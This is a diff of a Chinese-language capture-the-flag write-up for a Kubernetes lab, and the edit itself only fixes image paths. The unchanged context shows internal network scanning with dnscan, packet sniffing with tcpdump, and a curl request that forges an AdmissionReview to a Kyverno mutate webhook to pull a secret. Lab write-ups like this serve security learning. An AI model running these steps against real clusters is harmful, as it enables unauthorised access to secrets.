@@ -55,7 +55,7 @@ HISTFILESIZE=2048
 player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16
 ```
 
-![Untitled](image/2024-03-22/Untitled.png)
+![Untitled](./image/2024-03-22/Untitled.png)
 
 发现一个服务，访问即可拿到 flag
 
@@ -84,7 +84,7 @@ player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.1/16
 tcpdump -X
 ```
 
-![Untitled](image/2024-03-22/Untitled%201.png)
+![Untitled](./image/2024-03-22/Untitled%201.png)
 
 果然有一个服务在发送请求，flag在请求体里
 
@@ -180,7 +180,7 @@ spec:
 dnscan -subnet 10.100.0.1/16
 ```
 
-![Untitled](image/2024-03-22/Untitled%202.png)
+![Untitled](./image/2024-03-22/Untitled%202.png)
 
 为：`istio-protected-pod-service.k8s-lan-party.svc.cluster.local.`
 
@@ -271,7 +271,7 @@ spec:
 dnscan -subnet 10.100.0.1/16
 ```
 
-![Untitled](image/2024-03-22/Untitled%203.png)
+![Untitled](./image/2024-03-22/Untitled%203.png)
 
 ```bash
 10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
@@ -336,7 +336,7 @@ spec:
 curl -k -X POST https://kyverno-svc.kyverno.svc.cluster.local./mutate -H "Content-Type: application/json" --data '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{"uid":"705ab4f5-6393-11e8-b7cc-42010a800002","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"requestKind":{"group":"","version":"v1","kind":"Pod"},"requestResource":{"group":"","version":"v1","resource":"pods"},"name":"example-pod","namespace":"sensitive-ns","operation":"CREATE","userInfo":{"username":"admin","uid":"014fbff9a07c","groups":["system:authenticated"]},"object":{"apiVersion":"v1","kind":"Pod","metadata":{"name":"example-pod","namespace":"sensitive-ns"},"spec":{"containers":[{"name":"example-container","image":"nginx","env":[{"name":"FLAG","value":"{flag}"}]}]}},"oldObject":null,"options":{"apiVersion":"meta.k8s.io/v1","kind":"CreateOptions"},"dryRun":true}}'
 ```
 
-![Untitled](image/2024-03-22/Untitled%204.png)
+![Untitled](./image/2024-03-22/Untitled%204.png)
 
 把 patch 部分 base64 解码就可以得到 flag 了
 
